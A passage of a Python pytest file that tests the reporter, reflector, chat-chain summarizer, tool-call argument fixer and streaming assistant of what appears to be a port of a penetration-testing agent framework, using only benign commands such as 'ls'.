        """TaskResult requires 'success'."""
        with pytest.raises(ValidationError):
            TaskResult(result="r", message="m")  # type: ignore[call-arg]

    def test_reporter_constructor_defaults(self) -> None:
        """Reporter defaults: language='en', result_length_limit=4000."""
        r = Reporter()
        assert r.language == "en"
        assert r.result_length_limit == ReportResultLengthLimit == 4000
        assert ReportMessageLengthLimit == 500
        assert ReportResultToolName == "report_result"

    def test_reporter_constructor_with_custom_language(self) -> None:
        """A custom language code is honored."""
        r = Reporter(language="fr")
        assert r.language == "fr"


# ===========================================================================
# SECTION 14 — Reflector (5 tests)
# ===========================================================================


class TestReflector:
    """Brutal tests for the Reflector auxiliary agent."""

    def test_reflector_empty_response_returns_static(self) -> None:
        """An empty failed response yields the static fallback prompt."""
        r = ReflectorAgent(provider=None)
        out = r.run(AgentType.PRIMARY, "")
        assert "<reflection>" in out
        assert "<correction>" in out

    def test_reflector_very_long_response_succeeds(self) -> None:
        """A 50KB failed response is accepted and the static fallback is returned."""
        r = ReflectorAgent(provider=None)
        out = r.run(AgentType.PRIMARY, "x" * 51200)
        assert "<correction>" in out

    def test_reflector_unicode_response_succeeds(self) -> None:
        """A unicode failed response is accepted."""
        r = ReflectorAgent(provider=None)
        out = r.run(AgentType.PRIMARY, "弩级失敗応答")
        assert "<correction>" in out

    def test_reflector_static_mode_no_provider(self) -> None:
        """Static mode (provider=None) returns the deterministic template."""
        r = ReflectorAgent(provider=None)
        out = r.run(AgentType.SEARCHER, "free text", hint="expected done tool")
        assert "expected done tool" in out

    def test_reflector_llm_exception_falls_back_to_static(self) -> None:
        """If the LLM provider raises, the Reflector falls back to the static prompt."""
        class BoomProvider:
            def complete(self, prompt: str, *, system: Optional[str] = None) -> str:
                raise RuntimeError("LLM down")

        r = ReflectorAgent(provider=BoomProvider())
        out = r.run(AgentType.PRIMARY, "free text")
        assert "<correction>" in out


# ===========================================================================
# SECTION 15 — Summarizer (11 tests)
# ===========================================================================


class TestSummarizer:
    """Brutal tests for the Summarizer auxiliary agent + ChainAST."""

    async def test_summarizer_empty_chain_returns_empty(self) -> None:
        """An empty input chain produces an empty output chain."""
        s = SummarizerAgent(provider=None)
        out = await s.summarize_chain([])
        assert out == []

    async def test_summarizer_single_message_chain(self) -> None:
        """A single-message chain is returned (no sections to summarise)."""
        s = SummarizerAgent(provider=None)
        chain = [{"role": "user", "content": "hello"}]
        out = await s.summarize_chain(chain)
        assert isinstance(out, list)

    async def test_summarizer_oversized_chain_triggers_phase1(self) -> None:
        """A chain with >keep_qa_sections sections triggers Phase 1 summarization."""
        s = SummarizerAgent(provider=None, config=SummarizerConfig(keep_qa_sections=1))
        chain: list[dict[str, Any]] = []
        for i in range(5):
            chain.append({"role": "user", "content": f"q{i}"})
            chain.append({"role": "ai", "content": f"a{i}"})
        out = await s.summarize_chain(chain)
        assert isinstance(out, list)

    async def test_summarizer_idempotent_on_already_summarized(self) -> None:
        """Re-summarising an already-summarised chain is a no-op (no summary-of-summaries)."""
        s = SummarizerAgent(provider=None)
        already = [
            {"role": "user", "content": "q"},
            {"role": "ai", "content": f"{SUMMARIZED_CONTENT_PREFIX}\nstatic summary"},
        ]
        out = await s.summarize_chain(already)
        # The already-summarised AI content survives unchanged.
        ai_msgs = [m for m in out if m.get("role") == "ai"]
        assert any(SUMMARIZED_CONTENT_PREFIX in (m.get("content") or "") for m in ai_msgs)

    async def test_summarizer_phase1_section_summarization(self) -> None:
        """Phase 1 collapses old sections (index < n-keep_qa_sections) into summary body pairs."""
        s = SummarizerAgent(provider=None, config=SummarizerConfig(keep_qa_sections=1))
        chain = [
            {"role": "user", "content": "old q"},
            {"role": "ai", "content": "old a"},
            {"role": "user", "content": "new q"},
            {"role": "ai", "content": "new a"},
        ]
        out = await s.summarize_chain(chain)
        assert len(out) > 0
        # The new section's user content survives.
        assert any(m.get("content") == "new q" for m in out)

    async def test_summarizer_phase2_last_section_rotation(self) -> None:
        """Phase 2 keeps the last section's most-recent pair verbatim."""
        s = SummarizerAgent(
            provider=None,
            config=SummarizerConfig(keep_qa_sections=1, last_sec_bytes=10),
        )
        chain = [
            {"role": "user", "content": "q"},
            {"role": "ai", "content": "a1"},
            {"role": "ai", "content": "a2"},
            {"role": "ai", "content": "a3"},
        ]
        out = await s.summarize_chain(chain)
        # Last pair survives.
        assert any("a3" in (m.get("content") or "") for m in out)

    async def test_summarizer_phase3_qa_pair_summarization(self) -> None:
        """Phase 3 coalesces oversized chains into a summary section + recent kept ones."""
        cfg = SummarizerConfig(
            use_qa=True,
            keep_qa_sections=1,
            max_qa_sections=2,
            max_qa_bytes=200,
        )
        s = SummarizerAgent(provider=None, config=cfg)
        chain: list[dict[str, Any]] = []
        for i in range(8):
            chain.append({"role": "user", "content": f"q{i}" * 10})
            chain.append({"role": "ai", "content": f"a{i}" * 10})
        out = await s.summarize_chain(chain)
        assert isinstance(out, list)

    def test_summarizer_chain_ast_build_and_serialize_round_trip(self) -> None:
        """build_chain_ast + serialize_chain round-trips a simple chain."""
        chain = [
            {"role": "system", "content": "sys"},
            {"role": "user", "content": "q"},
            {"role": "ai", "content": "a"},
        ]
        ast = build_chain_ast(chain, force=True)
        out = serialize_chain(ast)
        assert isinstance(out, list)
        # The system message survives.
        assert any(m.get("role") == "system" for m in out)

    def test_summarizer_config_nine_defaults(self) -> None:
        """SummarizerConfig defaults match PentAGI's zero-value config."""
        cfg = SummarizerConfig()
        assert cfg.preserve_last is True
        assert cfg.use_qa is False
        assert cfg.summ_human_in_qa is False
        assert cfg.last_sec_bytes == 51200
        assert cfg.max_bp_bytes == 16384
        assert cfg.max_qa_sections == 10
        assert cfg.max_qa_bytes == 65536
        assert cfg.keep_qa_sections == 1
        assert cfg.last_section_reserve_pct == 25

    def test_chain_ast_size_bytes_tracking(self) -> None:
        """ChainAST tracks size_bytes after recompute_sizes()."""
        ast = build_chain_ast(
            [
                {"role": "user", "content": "q"},
                {"role": "ai", "content": "a"},
            ],
            force=True,
        )
        assert ast.size_bytes > 0

    def test_chain_ast_mutation_updates_size(self) -> None:
        """Adding a section and re-computing updates size_bytes."""
        ast = ChainAST()
        old = ast.size_bytes
        sec = ChainSection(header=SectionHeader(human_message={"role": "human", "content": "x"}))
        sec.recompute_size()
        ast.sections.append(sec)
        ast.recompute_sizes()
        assert ast.size_bytes > old


# ===========================================================================
# SECTION 16 — ToolCallFixer (5 tests)
# ===========================================================================


class TestToolCallFixer:
    """Brutal tests for the ToolCallFixer argument-repair auxiliary."""

    def test_toolcall_fixer_malformed_json_repair(self) -> None:
        """Trailing commas are repaired by the static pass."""
        fixer = ToolCallFixer(provider=None)
        original = {
            "name": "terminal",
            "arguments": '{"command": "ls",}',  # trailing comma
        }
        out = fixer.run(AgentType.PENTESTER, original, "invalid json")
        # The arguments field is now valid JSON.
        args_str = out.get("arguments") or out.get("function", {}).get("arguments", "")
        parsed = json.loads(args_str)
        assert parsed.get("command") == "ls"

    def test_toolcall_fixer_camel_to_snake_case(self) -> None:
        """camelCase keys are mapped to snake_case schema properties when normalised form matches."""
        schema = {
            "type": "object",
            "properties": {"user_name": {"type": "string"}},
            "required": ["user_name"],
        }
        fixer = ToolCallFixer(provider=None)
        out = fixer.run(
            AgentType.CODER,
            {"name": "t", "arguments": json.dumps({"userName": "alice"})},
            "missing field",
            tool_schema=schema,
        )
        args_str = out.get("arguments", "")
        parsed = json.loads(args_str)
        assert "user_name" in parsed
        assert parsed["user_name"] == "alice"

    def test_toolcall_fixer_fuzzy_key_matching(self) -> None:
        """Close-miss plural keys (e.g. 'commands' for 'command') match via Jaccard similarity."""
        schema = {
            "type": "object",
            "properties": {"command": {"type": "string"}},
            "required": ["command"],
        }
        fixer = ToolCallFixer(provider=None)
        out = fixer.run(
            AgentType.PENTESTER,
            {"name": "t", "arguments": json.dumps({"commands": "ls -la"})},
            "missing field",
            tool_schema=schema,
        )
        parsed = json.loads(out.get("arguments", ""))
        assert "command" in parsed
        assert parsed["command"] == "ls -la"

    def test_toolcall_fixer_static_mode_no_provider(self) -> None:
        """Without a provider, the fixer still produces a repaired tool call (static pass)."""
        fixer = ToolCallFixer(provider=None)
        out = fixer.run(
            AgentType.SEARCHER,
            {"name": "t", "arguments": '{"q": "log4shell"}'},
            "missing required field",
        )
        assert "arguments" in out

    def test_toolcall_fixer_drops_unknown_keys(self) -> None:
        """Unknown keys not in the schema are dropped during the static repair pass."""
        schema = {
            "type": "object",
            "properties": {
                "command": {"type": "string"},
                "cwd": {"type": "string"},
            },
            "required": ["command"],
        }
        fixer = ToolCallFixer(provider=None)
        out = fixer.run(
            AgentType.PENTESTER,
            {"name": "t", "arguments": json.dumps({"command": "ls", "junk": "x"})},
            "extra fields",
            tool_schema=schema,
        )
        parsed = json.loads(out.get("arguments", ""))
        assert "junk" not in parsed
        assert parsed.get("command") == "ls"


# ===========================================================================
# SECTION 17 — Assistant (4 tests)
# ===========================================================================


class TestAssistant:
    """Brutal tests for the Assistant interactive conversational agent."""

    async def test_assistant_streaming_yields_text_chunks(self) -> None:
        """Assistant.stream yields text chunks from the provider's stream_async generator."""
        class FakeProvider:
            async def complete_async(self, prompt: str, *, system: Optional[str] = None) -> str:
                return "hello"

            async def stream_async(
                self,
                prompt: str,
                *,
                system: Optional[str] = None,
                history: Optional[list[dict[str, Any]]] = None,
                tools: Optional[list[dict[str, Any]]] = None,
            ) -> AsyncIterator[str]:
                for chunk in ["hel", "lo", " world"]:
                    yield chunk

        a = Assistant(provider=FakeProvider())
        chunks = [c async for c in a.stream("hi")]
        assert "".join(chunks).startswith("hello")

    async def test_assistant_tool_invocation_executes_handler(self) -> None:
        """When the model emits a [TOOL_CALL:...] sentinel, the registered handler runs."""
        call_count = [0]

        class FakeProvider:
            async def complete_async(self, prompt: str, *, system: Optional[str] = None) -> str:
                return ""

            async def stream_async(
                self,
                prompt: str,
                *,
                system: Optional[str] = None,
                history: Optional[list[dict[str, Any]]] = None,
                tools: Optional[list[dict[str, Any]]] = None,
            ) -> AsyncIterator[str]:
                call_count[0] += 1
                if call_count[0] == 1:
                    yield '[TOOL_CALL:{"name":"echo","arguments":{"msg":"hi"}}]'
                    yield "done after tool"
                else:
                    yield "final answer"

        called: list[str] = []

        def echo(args: dict[str, Any], *, ctx: Any = None) -> str:
            called.append(args.get("msg", ""))
            return f"echoed:{args.get('msg')}"

        a = Assistant(provider=FakeProvider(), tools={"echo": echo}, max_tool_iterations=5)
        chunks = [c async for c in a.stream("hi")]
        assert called == ["hi"]
        assert any("echo" in c for c in chunks)
        assert any("final answer" in c for c in chunks)

    async def test_assistant_max_tool_iterations_cap(self) -> None:
        """The Assistant stops after max_tool_iterations to prevent infinite tool loops."""
        class LoopyProvider:
            async def complete_async(self, prompt: str, *, system: Optional[str] = None) -> str:
                return ""

            async def stream_async(
                self,
                prompt: str,
                *,
                system: Optional[str] = None,
                history: Optional[list[dict[str, Any]]] = None,
                tools: Optional[list[dict[str, Any]]] = None,
            ) -> AsyncIterator[str]:
                # Always emit a tool call — never a final text reply.
                yield '[TOOL_CALL:{"name":"loop","arguments":{}}]'

        def loop_tool(args: dict[str, Any], *, ctx: Any = None) -> str:
            return "again"

        a = Assistant(provider=LoopyProvider(), tools={"loop": loop_tool}, max_tool_iterations=3)
        chunks = [c async for c in a.stream("hi")]
        # The safety cap message must appear in the output.
        assert any("max tool iterations" in c for c in chunks)

    async def test_assistant_unknown_tool_rejection_returns_error_string(self) -> None:
        """An unknown tool call produces a structured error string (no exception)."""
        class FakeProvider:
            async def complete_async(self, prompt: str, *, system: Optional[str] = None) -> str:
                return ""

            async def stream_async(
                self,
                prompt: str,
                *,
                system: Optional[str] = None,
                history: Optional[list[dict[str, Any]]] = None,
                tools: Optional[list[dict[str, Any]]] = None,
            ) -> AsyncIterator[str]:
                yield '[TOOL_CALL:{"name":"nonexistent","arguments":{}}]'
                yield "after"

        a = Assistant(provider=FakeProvider(), tools={}, max_tool_iterations=1)
        # Should not raise; the loop should yield the safety cap message after
        # the unknown-tool error string is fed back to the (fake) model.
        chunks = [c async for c in a.stream("hi")]
        assert isinstance(chunks, list)


